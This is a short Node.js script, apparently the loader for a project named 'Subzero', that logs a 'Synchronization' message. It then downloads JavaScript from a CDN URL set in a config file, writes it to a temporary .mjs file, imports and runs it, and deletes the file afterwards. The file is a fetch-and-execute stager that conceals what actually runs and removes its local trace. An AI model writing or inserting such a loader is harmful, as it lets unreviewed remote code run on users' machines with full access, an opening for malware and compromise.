import axios from 'axios';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

import config from './settings.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

(async () => {
  try {
    console.log("❄️ Subzero Synchronization Initiated !");

    const { data: scriptCode } = await axios.get(
      `${config.CDN}/media/2026/mrfrank/subzero/index.js`
    );

    const tempPath = path.join(__dirname, 'temp-script.mjs');

    // Save file
    fs.writeFileSync(tempPath, scriptCode);

    // Import it as ES module
    await import(`file://${tempPath}`);

    // Optional: delete after run
    fs.unlinkSync(tempPath);

  } catch (err) {
    console.error("Error:", err);
  }
})();
